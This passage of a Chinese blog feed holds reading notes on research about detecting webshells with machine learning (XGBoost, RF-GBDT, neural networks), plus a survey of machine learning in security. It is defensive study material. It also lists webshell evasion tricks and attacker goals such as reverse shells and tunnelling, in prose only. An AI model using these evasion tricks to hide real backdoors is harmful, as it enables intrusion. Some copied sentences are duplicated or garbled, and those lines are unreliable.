  </entry>
  
  <entry>
    <title>(阅读笔记)基于XGBoost 算法的Websbell 检测方法研究</title>
    <link href="https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E5%9F%BA%E4%BA%8EXGBoost%E7%AE%97%E6%B3%95%E7%9A%84Webshell%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E7%A0%94%E7%A9%B6/"/>
    <id>https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E5%9F%BA%E4%BA%8EXGBoost%E7%AE%97%E6%B3%95%E7%9A%84Webshell%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E7%A0%94%E7%A9%B6/</id>
    <published>2020-10-12T14:03:51.000Z</published>
    <updated>2020-10-27T02:11:40.231Z</updated>
    
    <content type="html"><![CDATA[<p>为解决加密型Webshell 与非加密型Webshell 的代码特征不统一、难以提取的问题</p><p>对于加密型的Webshell,根据代码的静态特性,将<strong>文件重合指数</strong>、<strong>信息熵</strong>、<strong>最长字符串长度</strong>、<strong>压缩比</strong>４ 个参数作为其特征</p><p>国家互联网应急中心(CNCERT/CC)公布</p><p>常见的特征隐藏手段有:在代码中引入注释等无关的信息、外形混淆、字符串加解密、拆分、连接替换、多重编码与压缩、多文件等技术.</p><blockquote><p>１)引入注释:在不影响功能的前提下,引入诸如‘/∗…∗/’和‘//…’类的注释,会对检测工作造成一定的影响,间接保护后门的长期存在.<br>２)外形混淆:利用脚本语言灵活多变的语法特点,通过引入大量的自定义函数名、变量名等变量,对一些容易被检测到的函数进行特征变换,增加代码的理解难度[１０].<br>３)字符串加解密:将敏感的代码段进行加密,只在代码具体执行的过程中进行解密,从而绕过检测.<br>４)字符串拆分:利用脚本语言的拼接特性,将函数名拆成各种不同的组合,使用时再进行拼接.<br>５)连接替换:编写Webshell 时可能会用到一些系统控件,为了避免被检测到,给相应的控件名加入一些特殊字符,使用时通过别的函数进行过滤,从而达到躲避检测的目的.<br>６)多重编码与压缩:通过多重编码来改变代码的静态特征,结合压缩技术使得页面的特征发生变动,从而降低被检测到的概率.<br>７)多文件:将一个Webshell 拆分成多个文件,使用时通过各种文件包含技术再将它们连接起来,这样可以有效地降低Webshell 中一些功能函数集中出现的概率.</p></blockquote><p>将加密型与非加密型的Webshell 的主要特征归纳为以下几种:</p><blockquote><p>１)<strong>功能函数</strong></p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E5%9F%BA%E4%BA%8EXGBoost%E7%AE%97%E6%B3%95%E7%9A%84Webshell%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E7%A0%94%E7%A9%B6/image-20200415095907714.png" alt></p><p>２)<strong>文件重合指数</strong>：Webshell 经混淆编码后,在某种意义上可以当作密文,随着其内容的随机性变大,重合指数也会发生相应的变化.因此,可以把重合指数作为Webshell 的一个特征.</p><p>３)<strong>信息熵</strong>：为了隐藏一些特征,Webshell 的代码往往很混乱,信息熵也随之变大.</p><p> 4 )<strong>最长字符串长度</strong>：正常的网页语言一般不会出现很长的字符串;Webshell经过混淆编码后,很容易出现超出正常语法单词的长字符串.</p><p>５)<strong>压缩比</strong>：经过混淆编码的Webshell 消除了非ASCII 字符后,会表现出更小的不均衡分布,从而导致压缩值变大.</p></blockquote><p><strong>当前主流的检测技术</strong>：</p><blockquote><p><strong>１)静态特征检测</strong>：核心是围绕脚本文件的特征对关键词、文件权限、文件修改时间、文件拥有者、高危函数等多个维度进行信息提取,检测效果的好坏与这些特征的设定密切相关.</p><ul><li><p><strong>Linux 下基于SVM 分类器的WebShell 检测方法研究</strong>：基于页面属性和页面操作对Webshell 进行特征提取,然后使用SVM 分类器来进行判定.</p></li><li><p><strong>基于决策树的Webshell 检测方法研究</strong>：提取Webshell 的文档属性、基本属性、高级属性３ 类特征,采用C４．５ 决策树方法对Webshell 进行检测.</p></li><li><p><strong>基于支持向量机的Webshell 黑盒检测</strong>：把Webshell 的文件特征、编码特征、语言特征、标签特征、静态文件特征等作为特征数据,采用SVM 方法对Webshell进行检测</p></li></ul><p>静态特征检测方法对一些已有的Webshell 有效,但对０day 的Webshell 往往无效.由于过于依赖特征库的特点,该方法的误报率很高.对于加密或者采用混淆编码的Webshell而言,该方法自身也存在特征根本无法提取的问题.因此,静态特征检测往往需要手工检测作为辅助,才能完成Webshell的检测工作。</p></blockquote><blockquote><p><strong>２)流量分析检测</strong></p><p>该类方法的核心是通过建立网关对流量进行可视化处理,然后对Webshell 访问过程中产生的payload 网络流量进行监测.经过一定的payload 积累和相关规则的定制,通过与其他的检测过程相结合建立起一套基于流量分析的检测引擎,然后将其嵌入到现有的网关型设备或云端设备上,就可以实现对Webshell 的深度分析与查杀.</p><p><strong>３)日志分析检测</strong></p><p>采用日志分析的Webshell 检测,就是根据确定的攻击事件来进行事件回溯的,依据攻击事件的特征来防范下次遭受到相同的攻击.该类方法一般是先对日志建模,然后找到异常日志与攻击日志,其本质是对Webshell 访问日志进行提取与确认的过程.日志分析技术主要是从文本特征、统计特征和页面特征３ 个角度来检测异常文件,效果的好坏依赖于检测规则的完善与否;也有通过对请求模型进行建模的方法来检测Webshell,其属于一种词汇分析技术[１５].</p><p><strong>４)行为分析检测</strong></p><p>涉及到文件方面的行为有文件读写、创建与删除等;涉及到网络方面的行为有socket 监听行为、TCP/UDP/<br>HTTP 请求发送(DDOS 攻击)等;涉及到数据库读写的行为有数据库查找、修改、全库备份(脱库)等;涉及到系统配置的行为有Windows 注册表的修改、启动配置文件等</p><p>根据其执行机制编写相应的扩展模块,然后采用hook 技术,即过滤并阻止相关的异常操作行为.这种方式是通过监控操作系统底层的API(应用程序接口)调用实现的.</p><p>另一种方式是采用蜜罐技术,即将站点源码放在蜜罐中,然后对其行为特征进行分析来检测异常.</p><p><strong>５)统计学检测</strong></p><p>依据Webshell 脚本与正常文件的差异性来识别混淆代码.</p><p>其检测核心是通过统计学的方法计算出正常的PHP 文件的统计学特征的范围,然后将其与用户上传的文件进行比较.</p><p>主要涉及到５ 个特征:</p><p>信息熵(Entropy),通过使用ASCII 码来衡量文件的不确定性;</p><p>最长单词(LongestWord),正常文件里的字符串长度符合英文规范,不会出现极端情况,出现很长的字符串很大程度上意味着代码被编码加密或者混淆过;</p><p>重合指数(Index of Coincidence),低的重合指数预示着文件被加密过;</p><p>特征值匹配(Signature),匹配特征函数与敏感代码;</p><p>压缩比(Compression),Webshell 经编码后,与正常文件相比,压缩比会变大.</p><p><strong>基于贝叶斯理论的Webshell 检测方法研究</strong></p></blockquote><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E5%9F%BA%E4%BA%8EXGBoost%E7%AE%97%E6%B3%95%E7%9A%84Webshell%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E7%A0%94%E7%A9%B6/image-20200415105234227.png" alt></p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E5%9F%BA%E4%BA%8EXGBoost%E7%AE%97%E6%B3%95%E7%9A%84Webshell%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E7%A0%94%E7%A9%B6/image-20200415105427247.png" alt></p><p>TP(True Positive):预测当前页面是Webshell,实际上是Webshell.<br>FN(False Negative):预测当前页面不是Webshell,实际上是Webshell.</p><p>FP(False Positive):预测当前页面是Webshell,实际上不是Webshell.<br>TN(True Negative):预测当前页面不是Webshell,实际上不是Webshell.</p><p>Webshell 的评价标准主要有４ 个:特定度(Specificity)、灵敏度(Sensitivity)、准确度(Accuracy)和F１ 值</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E5%9F%BA%E4%BA%8EXGBoost%E7%AE%97%E6%B3%95%E7%9A%84Webshell%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E7%A0%94%E7%A9%B6/image-20200415105522381.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;为解决加密型Webshell 与非加密型Webshell 的代码特征不统一、难以提取的问题&lt;/p&gt;
&lt;p&gt;对于加密型的Webshell,根据代码的静态特性,将&lt;strong&gt;文件重合指数&lt;/strong&gt;、&lt;strong&gt;信息熵&lt;/strong&gt;、&lt;strong&gt;最长字符串长度&lt;/strong&gt;、&lt;strong&gt;压缩比&lt;/strong&gt;４ 个参数作为其特征&lt;/p&gt;
    
    </summary>
    
    
      <category term="Cyc1e的学术之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E5%AD%A6%E6%9C%AF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Webshell检测" scheme="https://cyc1e183.github.io/tags/Webshell%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>(阅读笔记)Webshell detection based on random forest-gradientboosting decision tree algori</title>
    <link href="https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Webshell%20detection%20based%20on%20random%20forest-gradientboosting%20decision%20tree%20algori/"/>
    <id>https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Webshell%20detection%20based%20on%20random%20forest-gradientboosting%20decision%20tree%20algori/</id>
    <published>2020-10-12T14:03:51.000Z</published>
    <updated>2020-10-27T02:09:37.714Z</updated>
    
    <content type="html"><![CDATA[<p>提出了一种PHP网络外壳检测模型RF-GBDT（Random Forest–Gradient Boosting Decision  Tree）模型，它是随机森林分类器和GBDT分类器的结合。此外，我们不仅利用了PHP源文件的信息熵、重合度指数等常见统计特性，还从PHP源文件中提取了TF-IDF向量和hash向量等操作码序列特征。</p><p>提出了RF-GBDT模型，如图1所示，它是随机森林和梯度增强决策树的组合。这是一个双层模型。在第一层，利用基于RF分类器的操作码序列的特征得到了初步的预测结果。然后，将PHP文件的统计特性与第一层的初步预测结果结合起来，参与下一层基于GBDT分类器的训练，产生最终的预测结果。</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Webshell%20detection%20based%20on%20random%20forest-gradientboosting%20decision%20tree%20algori/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>Webshell detection based on random forest-gradientboosting decision tree algori/image-20200422174714129.png)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;提出了一种PHP网络外壳检测模型RF-GBDT（Random Forest–Gradient Boosting Decision  Tree）模型，它是随机森林分类器和GBDT分类器的结合。此外，我们不仅利用了PHP源文件的信息熵、重合度指数等常见统计特性，还从PHP源文件中提取了TF-IDF向量和hash向量等操作码序列特征。&lt;/p&gt;
&lt;p&gt;提出了RF-GBDT模型，如图1所示，它是随机森林和梯度增强决策树的组合。这是一个双层模型。在第一层，利用基于RF分类器的操作码序列的特征得到了初步的预测结果。然后，将PHP文件的统计特性与第一层的初步预测结果结合起来，参与下一层基于GBDT分类器的训练，产生最终的预测结果。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Cyc1e的学术之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E5%AD%A6%E6%9C%AF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="webshell检测" scheme="https://cyc1e183.github.io/tags/webshell%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>(阅读笔记)基于PHP的WEB漏洞挖掘技术研究</title>
    <link href="https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E5%9F%BA%E4%BA%8EPHP%E7%9A%84WEB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    <id>https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E5%9F%BA%E4%BA%8EPHP%E7%9A%84WEB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/</id>
    <published>2020-10-12T14:03:51.000Z</published>
    <updated>2020-10-27T02:11:17.913Z</updated>
    
    <content type="html"><![CDATA[<p>采用的方法：</p><ul><li><p>提出基于漏洞特征信息的函数摘要方法， 提出基于漏洞特征信息的函数摘要方法</p><p>主要是总结了各种类型漏洞的特征，根据这些特征信息进行函数摘要（需要建立一个已知漏洞的特征模型）</p></li><li><p>提出了基于路径特征的程序切片方法</p><p>根据漏洞触发的特征，剪去那些不可能存在漏洞的路径信息（个人觉得这个方法不适用，只能针对已经设定的类型）</p></li><li><p>结合污点分析和动态符号执行方法</p><p>在动态符号执行过程中，根据污点检查的算法，对符号状态进行分析</p></li></ul><p>提出了基于漏洞特征信息的函数摘要方法以及路径程序切片法，</p><p>特点：优化了动态符号执行的时间效率并将方与污点分析相结合 法，优化了动态符号执行的时间效率并将方与污点分析相结合法，优化了动态符号执行的时间效率并将方与污点分析相结合 ，用以检测 Web应用程序漏洞。</p><p>设计的PHPVS系统主要是采用词法、语法分析来生成符号执行树（这里还不是太了解）</p><p>主要是在条件判断语句上做路劲分叉形成符号树。</p><p>对于污点分析的实现和符号树的构造没有详细说明（需要进一步了解）</p><p>本论文的实验论证的实例是自己构造的漏洞代码片段。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;采用的方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;提出基于漏洞特征信息的函数摘要方法， 提出基于漏洞特征信息的函数摘要方法&lt;/p&gt;
&lt;p&gt;主要是总结了各种类型漏洞的特征，根据这些特征信息进行函数摘要（需要建立一个已知漏洞的特征模型）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;提出了基于路径特征的程序切片方法&lt;/p&gt;
&lt;p&gt;根据漏洞触发的特征，剪去那些不可能存在漏洞的路径信息（个人觉得这个方法不适用，只能针对已经设定的类型）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;结合污点分析和动态符号执行方法&lt;/p&gt;
&lt;p&gt;在动态符号执行过程中，根据污点检查的算法，对符号状态进行分析&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Cyc1e的学术之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E5%AD%A6%E6%9C%AF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="webshell检测" scheme="https://cyc1e183.github.io/tags/webshell%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>(阅读笔记)机器学习在网络安全中的应用</title>
    <link href="https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</id>
    <published>2020-10-12T14:03:51.000Z</published>
    <updated>2020-10-27T02:10:34.745Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200407163404074.png" alt></p><h3 id="机器学习在网络空间安全中的应用流程"><a href="#机器学习在网络空间安全中的应用流程" class="headerlink" title="机器学习在网络空间安全中的应用流程"></a>机器学习在网络空间安全中的应用流程</h3><p>机器学习在网络空间安全研究中的一般应用流程，主要包括安全问题抽象、数据采集、数据预处理及安全特征提取、模型构建、模型验证以及模型效果评估6个阶段.在整个应用流程中，各阶段不能独立存在，相互之间存在一定的关联关系.</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200408155819177.png" alt></p><p>使用机器学习技术解决安全问题的第一步就是要进行问题的抽象和定义，将安全问题映射为机器学习能够解决的分类、聚类及降维等问题</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200408160234176.png" alt></p><p>数据预处理及特征提取主要包括堆数据规范化、离散化以及非平衡性的处理等</p><p>深度学习[3]凭借强大的自动提取特征的能力，被用于解决异常协议检测、恶意软件检测、网络入侵检测BGP（Border Gateway Protocol）异常路由检测以及差分隐私保护等安全问题.</p><p>常用的分类评估指标有正确率、查准率（又称精度）和查全率（又称召回率）.</p><blockquote><p>正确率是分类正确的正常样本与恶黛样本数占样本总数的比例，一般来说正确率越高，分类器越好.查准率则是被正确识别的正常样本数占被识别为正常样本的比例，也是分类器精确性的衡量标准.查率是被正确识别的正常样本与正确识别的正常样参参和错误识别的恶意样本之和的比例，该指标衡量了分类器对正常样本的识别能力.</p></blockquote><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200408163443448.png" alt></p><h3 id="机器学习在系统安全研究中的应用"><a href="#机器学习在系统安全研究中的应用" class="headerlink" title="机器学习在系统安全研究中的应用"></a>机器学习在系统安全研究中的应用</h3><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200408165505024.png" alt></p><h3 id="机器学习在网络安全研究中的应用"><a href="#机器学习在网络安全研究中的应用" class="headerlink" title="机器学习在网络安全研究中的应用"></a>机器学习在网络安全研究中的应用</h3><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200408170530426.png" alt></p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200408202520748.png" alt></p><p>根据入侵检测系统中检测引擎使用方法的不同，网络入侵检测分为误用检测、异常检测及混合检测.误用检测是以已知攻击为特征，将入侵行为与正常行为按照已知的特征区分开来.该类方法效率高且误报率低，但只能发现已知的入侵，漏报率较高，并且特征的维护多采用人工方式完成.异常检测指将当前网络行为与系统正常行为模式进行比较，若两者偏差较大，超过了预定义的阈值，则认为系统出现了异常或被入侵.</p><p>将机器学习技术应用于网络入侵检测系统的一般流程如图6所示：首先通过网络流量采集工具Snort、Wireshark等自行采集数据集或者采用公开的网络入侵数据集，接着对数据集进行预处理从中提取网络入侵特征，然后选择合适的机器学习算法构建入侵检测分类器，对待测数据识别是正常行为还是异常行为.</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200408203159872.png" alt></p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200408204429751.png" alt></p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200408210203497.png" alt></p><p>机器学习在网络安全中的应用小结</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200408210306592.png" alt></p><h3 id="机器学习在应用安全研究中的应用"><a href="#机器学习在应用安全研究中的应用" class="headerlink" title="机器学习在应用安全研究中的应用"></a>机器学习在应用安全研究中的应用</h3><h4 id="1、在垃圾邮件检查领域"><a href="#1、在垃圾邮件检查领域" class="headerlink" title="1、在垃圾邮件检查领域"></a>1、在垃圾邮件检查领域</h4><p>垃圾邮件的检测可以抽象为机器学习的文本分类问题，例如，最简单的分类可以定义为{一1，1}，一1代表非垃圾邮件；1代表垃圾邮件.</p><h4 id="2、基于URL的恶意网页识别"><a href="#2、基于URL的恶意网页识别" class="headerlink" title="2、基于URL的恶意网页识别"></a>2、基于URL的恶意网页识别</h4><p>基于分类方法的恶意网页识别，通常将该问题抽象为机器学习的二分类问题，一般流程如图8所示，首先根据已标记URL数据集进行特征提取，常用的静态特征包括主机信息、URL信息和网页信息等，动态特征主要包括浏览器行为、URL的重定向信息、网页跳转关系等；对上述特征进行归一化处理，归一化后特征的取值用{0，1}表示；已知的网页标记用{0，1}表示，{0）代表正常网页，{1）代表恶意网页；然后选择决策树、贝叶斯网络、SVM、逻辑回归等分类算法构造分类器，进而识别未知类型URL数据集.</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200409161406008.png" alt></p><p>基于聚类的恶意网页识别的一般流程如图9所示，首先将网页采集的URL数据集中提取链接关系、URL特征、网页文本信息等特征，通常采用{0，1）标识；然后根据聚类算法，将URL数据集划分为若干聚类，同一聚类的URL数据之间具有较高的相似度，而不同聚类的URL数据对象之间的相似度较低；最后根据已标记数据的聚类结果，对待测URL识别是否是恶意网页.</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200409162923123.png" alt></p><h4 id="3、恶意PDF检测"><a href="#3、恶意PDF检测" class="headerlink" title="3、恶意PDF检测"></a>3、恶意PDF检测</h4><p>PDF文档的检测研究大多采用PDF文档内容或结构为特征，利用随机森林、SVM、决策树等分类器构建PDF检测器.</p><h4 id="4、社交网络异常账号"><a href="#4、社交网络异常账号" class="headerlink" title="4、社交网络异常账号"></a>4、社交网络异常账号</h4><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200409170053350.png" alt></p><h4 id="信用卡欺诈检测"><a href="#信用卡欺诈检测" class="headerlink" title="信用卡欺诈检测"></a>信用卡欺诈检测</h4><h4 id="取证分析"><a href="#取证分析" class="headerlink" title="取证分析"></a>取证分析</h4><h4 id="网络舆情"><a href="#网络舆情" class="headerlink" title="网络舆情"></a>网络舆情</h4><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200409171136507.png" alt></p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200409171201297.png" alt></p><p>无论是模型的泛化能力，还是检测准确度、实时性等问题，目前的技术解决方案均不能完全满足网络空间安全的应用需求，并存在一些目前难以解决的问题以及可进一步研究的方向，采用机器学习技术解决网络空间安全问题仍是极具挑战性的工作.同时机器学习技术本身存在一定的研究难点，在解决网络空间安全问题中面临巨大挑战：</p><blockquote><p>（1）基于机器学习的安全解决方案的可解释性与溯源性.</p><p>（2）基于机器学习技术的攻击的防御难度.</p><p>（3）机器学习自身的安全问题.</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/image-20200407163404074.png&quot; alt&gt;&lt;/p&gt;
&lt;h3 id=&quot;机器学习在网络空间安全中的应用流程&quot;&gt;&lt;a href=&quot;#机器学习在网络空间安全中的应用流程&quot; class=&quot;headerlink&quot; title=&quot;机器学习在网络空间安全中的应用流程&quot;&gt;&lt;/a&gt;机器学习在网络空间安全中的应用流程&lt;/h3&gt;
    
    </summary>
    
    
      <category term="Cyc1e的学术之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E5%AD%A6%E6%9C%AF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="机器学习" scheme="https://cyc1e183.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>(阅读笔记)基于语义分析和神经网络的WebShell检测方法</title>
    <link href="https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E5%9F%BA%E4%BA%8E%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84WebShell%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/"/>
    <id>https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)%E5%9F%BA%E4%BA%8E%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84WebShell%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/</id>
    <published>2020-10-12T14:03:51.000Z</published>
    <updated>2020-10-27T02:12:13.020Z</updated>
    
    <content type="html"><![CDATA[<p>作者WebShell的行为和目的主要包括四个方面。</p><blockquote><p><strong>信息嗅探</strong>：以嗅探Web运行环境信息、主机信息、数据库信息、IDC网络信息为目的，将收集到的各类信息回显在页面中或通过其它渠道反馈给攻击者，攻击者可以将收集到的信息用于下一步的入侵中。</p><p><strong>权限维持</strong>：攻击者可以通过HTTP请求的参数（包括GET/POST参数、Cookie、Header等）传递命令，由WebShell以Web应用运行权限执行命令，是一种攻击成功后较隐蔽的权限维持手段。此外，攻击者还可以通过各种反弹Shell手法获取到交互式Shell，利用系统本地内核漏洞进行提权。</p><p><strong>数据窃取和篡改</strong>：嗅探到数据库连接方式等配置信息后，攻击者可以利用WebShell窃取或篡改数据库内的敏感信息。</p><p><strong>网络代理</strong>： 攻击者可以利用WebShel l建立TCP/IP网络隧道，用于嗅探、扫描IDC网络和进一步的内网渗透，例如著名的reGeorg工具就利用了WebShell建立SOCKS5隧道。</p></blockquote><h3 id="Webshell逃逸"><a href="#Webshell逃逸" class="headerlink" title="Webshell逃逸"></a>Webshell逃逸</h3><ul><li>字符串编码与构造</li><li>代码混淆</li><li>利用反射机制</li><li>文件包含</li><li>流量加密</li><li>隐蔽通道</li></ul><p>根据WebShell的检测和防御手段的介入阶段不同，可以分为事前预警、事中检测、事后追溯三种。</p><p>对WebShel l的检测防御思路主要分为基于文件的检测、基于流量的检测、基于行为的检测和基于日志的检测等。其中，基于文件的检测是在WebShel l 刚被植入时，通过对文件属性、内容、关键字等进行静态分析判断是否为WebShel 